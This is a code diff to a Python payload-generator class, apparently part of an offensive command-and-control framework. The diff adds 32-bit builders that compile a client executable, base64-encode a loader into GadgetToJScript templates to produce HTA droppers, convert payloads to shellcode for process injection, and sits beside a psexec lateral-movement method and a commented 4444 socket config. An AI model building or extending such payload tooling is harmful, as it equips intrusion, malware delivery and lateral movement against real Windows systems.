@@ -42,6 +42,7 @@ class mypayloadgen():
         self.__base64_template = "Invoke-Base64.ps1"
         self.__base64_file_tag = r"%%filename%%"
         self.__base64_topayload = "payload\\loader.bin"
+        self.__base64_topayload32 = "payload\\loader32.bin"
 
         self.__gtojs_template = "GadgetToJScript.cs"
         self.__gtojs_toCS = "Client\\external\\GadgetToJScript\\"
@@ -51,7 +52,7 @@ class mypayloadgen():
 
 
 
-        self.__mystd = subprocess.DEVNULL
+        self.__mystd = None
 
     def debug_mode(self,inbool):
         if inbool:
@@ -85,6 +86,30 @@ class mypayloadgen():
         
         subprocess.run(["gtojs.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
+    def gen_hta32(self):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        #regen exe first
+        subprocess.run(["build32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        #pre-compile config
+        subprocess.run(["conf-gtojs32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__base64_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__base64_template),mode='w') as f:
+            f.write(all_of_it.replace(self.__base64_file_tag,self.__base64_topayload32))
+        
+        output = subprocess.run(["b64gen.bat"], capture_output=True, shell=True, cwd=mycwd)
+        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__gtojs_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__gtojs_toCS,self.__gtojs_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__gtojs_payload_tag,myb64))
+        
+        subprocess.run(["gtojs32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
 
     def gen_ps1(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -111,6 +136,9 @@ class mypayloadgen():
         mycwd = os.path.join(self.__parentdir,self.__to_client)
         subprocess.run(["build.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)
 
+    def gen_exe32(self):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        subprocess.run(["build32.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)
 
     def gen_inject(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
@@ -138,6 +166,15 @@ class mypayloadgen():
         
         with open(os.path.join(self.__parentdir,self.__to_psdb,self.__inject_outputname),mode='w') as f:
             f.write(all_of_it.replace(self.__payload_tag,myb64))
+
+    def gen_inject32(self):
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        #regen exe first
+        subprocess.run(["build32.bat"], shell=True, cwd=mycwd,stdout=self.__mystd)
+
+        #pre-compile config
+        subprocess.run(["conf-inject32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #to shellcode
+        subprocess.run(["inject32.bat"], shell=True, cwd=mycwd, stdout=self.__mystd) #buid
 
 
     def gen_psexec(self): #this will jump using current payload config, windows\temp need to be accessable
@@ -213,6 +250,6 @@ class mypayloadgen():
 if __name__ == "__main__":
     t_mypayloadgen = mypayloadgen()
     #t_mypayloadgen.set_config("socket",False,"127.0.0.1",4444)
-    t_mypayloadgen.gen_gtojs()
+    t_mypayloadgen.gen_inject()
 
 
